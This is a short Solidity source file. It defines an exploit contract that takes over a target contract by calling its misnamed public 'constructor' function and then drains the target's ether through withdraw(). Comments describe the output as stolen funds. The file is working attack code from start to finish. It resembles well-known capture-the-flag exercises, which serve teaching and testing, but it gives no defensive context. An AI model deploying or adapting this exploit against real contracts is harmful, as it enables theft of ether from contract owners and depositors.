pragma solidity ^0.4.24;

interface IVulnerable {
    function missing() external;
    function withdraw() external;
    function () external payable;
}

contract ExploitMissing {
    address public attacker;
    IVulnerable public vulnerable;

    constructor(address _target) public {
        attacker = msg.sender;
        vulnerable = IVulnerable(_target);
    }

    // Step 1: Become the owner by calling the misnamed constructor
    function attack() external {
        require(msg.sender == attacker);

        // Call the "constructor" (actually a public function)
        vulnerable.missing();

        // Call withdraw to drain funds
        vulnerable.withdraw();
    }

    // Receive stolen ether
    function () external payable {}
}

